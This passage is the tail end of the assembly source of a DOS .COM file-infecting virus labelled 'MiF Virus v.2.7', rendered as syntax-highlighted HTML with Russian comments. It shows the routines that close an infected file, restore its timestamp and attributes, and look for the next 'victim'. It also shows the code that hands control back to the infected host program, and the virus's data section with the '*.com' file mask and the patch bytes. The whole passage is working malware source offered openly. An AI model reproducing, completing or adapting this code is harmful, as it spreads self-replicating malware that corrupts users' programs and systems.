        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

        </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">close</span><span class="sc0">                </span><span class="sc1">; есть ошибки? тогда - следующий</span><span class="sc0">


        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">time</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">date</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc5">close</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">              </span><span class="sc1">; закрыть файл</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">


</span><span class="sc5">find_next</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">attribs</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">dta</span><span class="sc4">+</span><span class="sc2">1eh</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4fh</span><span class="sc0">              </span><span class="sc1">; ищем следующую жертву</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">file</span><span class="sc0">

</span><span class="sc5">exit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1ah</span><span class="sc0">              </span><span class="sc1">; DTA, 80h (стандартно)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc1">; восстановить оригинальный int 24h</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2524h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

</span><span class="sc1">; int 24h восстановлен</span><span class="sc0">


        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc0">              </span><span class="sc1">; восстановить путь ДОСа</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">path_buffer</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">0004</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">               </span><span class="sc1">; передать управление зараженной</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">                  </span><span class="sc1">; программе (косвенный jmp на 100h)</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; данные, нужные вирусу</span><span class="sc0">

</span><span class="sc5">pdir</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'..'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">filespec</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'*.com'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">first_bytes</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">0E9h</span><span class="sc4">,</span><span class="sc2">0h</span><span class="sc4">,</span><span class="sc2">0h</span><span class="sc0">
</span><span class="sc5">orig_bytes</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0cdh</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc0">
</span><span class="sc5">virname</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'[ MiF ]'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">len</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">real_start</span><span class="sc0">

</span><span class="sc5">end_vir</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">; мусор</span><span class="sc0">

</span><span class="sc5">path_buffer</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">64</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">dta</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">42</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">attribs</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">time</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">date</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">

</span><span class="sc1">;  ·------------------- Source Of MiF Virus v.2.7 -------------------·</span></div></body>
</html>
